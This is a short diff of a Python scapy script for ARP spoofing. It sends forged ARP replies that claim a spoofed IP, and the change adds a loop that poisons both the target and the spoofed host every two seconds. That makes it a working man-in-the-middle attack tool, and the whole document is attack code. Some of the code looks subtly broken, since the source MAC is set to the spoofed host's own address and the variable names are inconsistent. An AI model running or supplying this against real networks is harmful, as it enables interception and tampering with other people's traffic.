@@ -25,10 +25,15 @@ def spoof(targer_ip,spoof_ip):
     targer_mac=get_macaddress(targer_ip)
     spoof_mac=get_macaddress(spoof_ip)
     aro_response=sc.ARP(op=2,pdst=targer_ip,hwdst=targer_mac,psrc=spoof_ip,hwsrc=spoof_mac)
+    sc.send(aro_response,verbose=False)
+try:
     while True:
         time.sleep(2)
-        sc.send(aro_response,verbose=False)
+        spoof(target_ip,spoof_ip)
+        spoof(spoof_ip,target_ip)
         print("start spoofing")
+except KeyboardInterrupt:
+    print("exit")
 
 
 
